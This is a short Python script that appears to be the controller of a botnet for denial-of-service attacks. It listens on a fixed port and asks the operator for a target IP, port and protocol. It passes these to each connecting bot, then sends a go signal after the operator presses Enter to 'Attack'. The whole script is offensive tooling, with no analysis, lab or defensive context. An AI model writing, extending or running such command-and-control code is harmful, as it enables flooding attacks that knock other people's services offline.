import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket succesfully created')
port = 10242
s.bind(("", port))
print(f'socket binded to port{port}')
s.listen()
print('Socket is listening')
hostname = input("IP:")
hostport = input("Port:")
proto = input("Protocol:")
x = True
while True:
    c, addr = s.accept()
    c.send(hostname.encode())
    c.close()

    c, addr = s.accept()
    c.send(hostport.encode())
    c.close()

    c, addr = s.accept()
    c.send(proto.encode())
    c.close()
    if x == True:
        x = input("Press Enter To Attack")
        c, addr = s.accept()
        c.send(x.encode())
        c.close()
        print("Attack Started!!!")
        x = False
    print('Bot connected from', addr)
    
